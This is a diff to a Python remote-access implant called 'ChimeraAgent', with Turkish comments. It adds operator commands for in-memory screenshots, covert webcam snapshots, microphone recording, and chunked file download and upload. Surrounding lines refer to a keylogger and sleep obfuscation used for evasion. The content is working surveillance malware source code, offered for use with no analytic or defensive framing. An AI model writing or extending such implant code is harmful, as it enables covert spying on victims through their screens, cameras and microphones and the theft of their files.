@@ -2831,12 +2831,16 @@ class ChimeraAgent:
     # --------------------------------------------------------
     # Ekran Görüntüsü (Screenshot) - RAM üzerinden capture
     # --------------------------------------------------------
-    def take_screenshot(self) -> str:
+    def take_screenshot(self, quality: int = 100, fmt: str = "png") -> str:
         """Anlık ekran görüntüsü alıp base64 encoded olarak döner.
         
         Tüm işlem RAM üzerinde gerçekleşir, diske herhangi bir dosya yazılmaz.
         Platform bağımsız çalışır: Windows, Linux, macOS.
         
+        Args:
+            quality: JPEG kalitesi (1-100)
+            fmt: Resim formatı (png, jpeg, bmp)
+            
         Returns:
             str: SCREENSHOT_OK:<base64_png_data> veya hata mesajı
         """
@@ -2844,22 +2848,49 @@ class ChimeraAgent:
         import tempfile
         
         png_data = None
-        
-        # Yöntem 1: mss kütüphanesi (cross-platform, en güvenilir)
+        fmt_upper = fmt.upper()
+        if fmt_upper not in ["PNG", "JPEG", "BMP"]:
+            fmt_upper = "PNG"
+            
+        # Yöntem 1: mss + PIL kütüphanesi
+        try:
+            import mss
+            from PIL import Image
+            with mss.mss() as sct:
+                monitor = sct.monitors[0]
+                screenshot = sct.grab(monitor)
+                
+                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
+                buffer = io.BytesIO()
+                
+                if fmt_upper == "JPEG":
+                    img = img.convert("RGB")
+                    img.save(buffer, format='JPEG', quality=quality)
+                else:
+                    img.save(buffer, format=fmt_upper)
+                    
+                png_data = buffer.getvalue()
+                buffer.close()
+            
+            b64_data = base64.b64encode(png_data).decode('utf-8')
+            return f"SCREENSHOT_OK:{b64_data}"
+        except ImportError:
+            pass  # PIL veya mss yok
+        except Exception:
+            pass
+            
+        # Yöntem 1 Fallback (sadece mss, PIL yoksa)
         try:
             import mss
             with mss.mss() as sct:
-                # Tüm monitörleri kapsayan screenshot
-                monitor = sct.monitors[0]  # 0 = tüm ekranlar
+                monitor = sct.monitors[0]
                 screenshot = sct.grab(monitor)
-                
-                # PNG formatına çevir (RAM üzerinde)
                 png_data = mss.tools.to_png(screenshot.rgb, screenshot.size)
             
             b64_data = base64.b64encode(png_data).decode('utf-8')
             return f"SCREENSHOT_OK:{b64_data}"
         except ImportError:
-            pass  # mss yüklü değil, diğer yöntemleri dene
+            pass
         except Exception:
             pass
         
@@ -2868,7 +2899,11 @@ class ChimeraAgent:
             from PIL import ImageGrab
             img = ImageGrab.grab()
             buffer = io.BytesIO()
-            img.save(buffer, format='PNG')
+            if fmt_upper == "JPEG":
+                img = img.convert("RGB")
+                img.save(buffer, format='JPEG', quality=quality)
+            else:
+                img.save(buffer, format=fmt_upper)
             png_data = buffer.getvalue()
             buffer.close()
             
@@ -3035,6 +3070,95 @@ class ChimeraAgent:
                 return f"[!] Screenshot hatası (Linux): {str(e)}"
         
         return "[!] Screenshot alınamadı. Lütfen 'pip install mss' veya 'pip install Pillow' kurun."
+
+    def take_webcam_snap(self) -> str:
+        """Kameradan tek bir kare fotoğraf çeker.
+        
+        Returns:
+            str: WEBCAM_OK:<base64_data> veya hata mesajı
+        """
+        try:
+            import cv2
+            cap = cv2.VideoCapture(0)
+            if not cap.isOpened():
+                return "[!] Kamera bulunamadı veya açılamadı."
+            
+            # Kameranın ısınması için küçük bir bekleme ve frame atlama yapabiliriz
+            # ama hızlı olması için doğrudan çekelim.
+            ret, frame = cap.read()
+            cap.release()
+            
+            if not ret:
+                return "[!] Kameradan görüntü okunamadı."
+                
+            # JPEG'e kodla
+            ret, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90])
+            if not ret:
+                return "[!] Görüntü kodlanamadı."
+                
+            b64_data = base64.b64encode(buffer).decode('utf-8')
+            return f"WEBCAM_OK:{b64_data}"
+        except ImportError:
+            return "[!] cv2 kütüphanesi eksik, webcam özelliği desteklenmiyor."
+        except Exception as e:
+            return f"[!] Webcam hatası: {str(e)}"
+            
+    def record_audio(self, seconds: int = 5) -> str:
+        """Mikrofondan ses kaydeder.
+        
+        Returns:
+            str: AUDIO_OK:<base64_wav_data> veya hata mesajı
+        """
+        try:
+            import pyaudio
+            import wave
+            import io
+            
+            CHUNK = 1024
+            FORMAT = pyaudio.paInt16
+            CHANNELS = 1
+            RATE = 44100
+            
+            p = pyaudio.PyAudio()
+            # Varsayılan input device'ı bul
+            try:
+                stream = p.open(format=FORMAT,
+                                channels=CHANNELS,
+                                rate=RATE,
+                                input=True,
+                                frames_per_buffer=CHUNK)
+            except Exception as e:
+                p.terminate()
+                return f"[!] Mikrofon açılamadı: {str(e)}"
+                
+            frames = []
+            for i in range(0, int(RATE / CHUNK * seconds)):
+                data = stream.read(CHUNK)
+                frames.append(data)
+                
+            stream.stop_stream()
+            stream.close()
+            p.terminate()
+            
+            # WAV oluştur
+            buffer = io.BytesIO()
+            wf = wave.open(buffer, 'wb')
+            wf.setnchannels(CHANNELS)
+            wf.setsampwidth(p.get_sample_size(FORMAT))
+            wf.setframerate(RATE)
+            wf.writeframes(b''.join(frames))
+            wf.close()
+            
+            wav_data = buffer.getvalue()
+            buffer.close()
+            
+            b64_data = base64.b64encode(wav_data).decode('utf-8')
+            return f"AUDIO_OK:{b64_data}"
+            
+        except ImportError:
+            return "[!] pyaudio kütüphanesi eksik, ses kayıt özelliği desteklenmiyor."
+        except Exception as e:
+            return f"[!] Ses kayıt hatası: {str(e)}"
 
     # --------------------------------------------------------
     # Sleep Obfuscation (Uyku Sırasında Bellek Koruma)
@@ -3468,8 +3592,33 @@ class ChimeraAgent:
             return self.detect_environment()
         
         # Ekran görüntüsü komutu (RAM üzerinden capture & transfer)
-        if cmd_lower == "screenshot":
-            return self.take_screenshot()
+        if cmd_lower.startswith("screenshot"):
+            try:
+                parts = cmd_lower.strip().split()
+                quality = 100
+                fmt = "png"
+                if len(parts) > 1:
+                    quality = int(parts[1])
+                if len(parts) > 2:
+                    fmt = parts[2].lower()
+                return self.take_screenshot(quality, fmt)
+            except ValueError:
+                return "[!] Geçersiz screenshot kalitesi (1-100)."
+                
+        # Webcam Görüntüsü
+        if cmd_lower == "webcam_snap":
+            return self.take_webcam_snap()
+            
+        # Audio Kaydı
+        if cmd_lower.startswith("audio_record"):
+            try:
+                parts = cmd_lower.strip().split()
+                seconds = 5
+                if len(parts) > 1:
+                    seconds = int(parts[1])
+                return self.record_audio(seconds)
+            except ValueError:
+                return "[!] Geçersiz süre (saniye)."
 
         # Keylogger Komutları
         if cmd_lower == "keylogger_start":
@@ -3890,6 +4039,45 @@ class ChimeraAgent:
             except Exception as e:
                 return f"[!] İndirme hatası: {str(e)}"
 
+        # Chunked Download
+        elif cmd_lower.startswith("download_chunk "):
+            try:
+                parts = cmd.split(" ", 3)
+                if len(parts) < 4:
+                    return "[!] Hata: download_chunk <remote_path> <offset> <size>"
+                
+                file_path = parts[1].strip()
+                offset = int(parts[2].strip())
+                size = int(parts[3].strip())
+                
+                if not os.path.exists(file_path):
+                    return f"[!] Hata: Dosya bulunamadı: {file_path}"
+                
+                if os.path.isdir(file_path):
+                    return f"[!] Hata: Bu bir klasör, dosya değil."
+
+                with open(file_path, "rb") as f:
+                    f.seek(offset)
+                    chunk_data = f.read(size)
+                    b64_content = base64.b64encode(chunk_data).decode('utf-8')
+                
+                return f"DOWNLOAD_CHUNK_OK:{b64_content}"
+            except Exception as e:
+                return f"[!] İndirme hatası: {str(e)}"
+
+        # Dosya boyutu (Chunked Transfer İçin)
+        elif cmd_lower.startswith("file_size "):
+            try:
+                file_path = cmd.strip()[10:].strip()
+                if not os.path.exists(file_path):
+                    return f"FILE_SIZE_ERROR:Bulunamadı:{file_path}"
+                if os.path.isdir(file_path):
+                    return f"FILE_SIZE_ERROR:Klasör_okunamaz:{file_path}"
+                size = os.path.getsize(file_path)
+                return f"FILE_SIZE_OK:{size}"
+            except Exception as e:
+                return f"FILE_SIZE_ERROR:{str(e)}"
+
         # Özel komutlar - Dosya Yükleme (upload)
         # Kullanım: upload <hedef_yol> <b64_data>
         # (Bu komut handler tarafından oluşturulur)
@@ -3909,6 +4097,31 @@ class ChimeraAgent:
                     f.write(file_content)
                     
                 return f"[+] Dosya başarıyla yüklendi: {target_path} ({len(file_content)} bytes)"
+            except Exception as e:
+                return f"[!] Yükleme hatası: {str(e)}"
+
+        # Chunked Upload
+        elif cmd.startswith("upload_chunk "):
+            try:
+                parts = cmd.split(" ", 3)
+                if len(parts) < 4:
+                    return "[!] Hata: upload_chunk <path> <offset> <b64_data>"
+                
+                target_path = parts[1]
+                offset = int(parts[2])
+                b64_data = parts[3]
+                
+                file_content = base64.b64decode(b64_data)
+                
+                mode = "r+b" if os.path.exists(target_path) else "wb"
+                if offset == 0:
+                    mode = "wb"
+                
+                with open(target_path, mode) as f:
+                    f.seek(offset)
+                    f.write(file_content)
+                    
+                return f"[+] Chunk başarıyla yüklendi: {target_path} offset {offset} ({len(file_content)} bytes)"
             except Exception as e:
                 return f"[!] Yükleme hatası: {str(e)}"
 
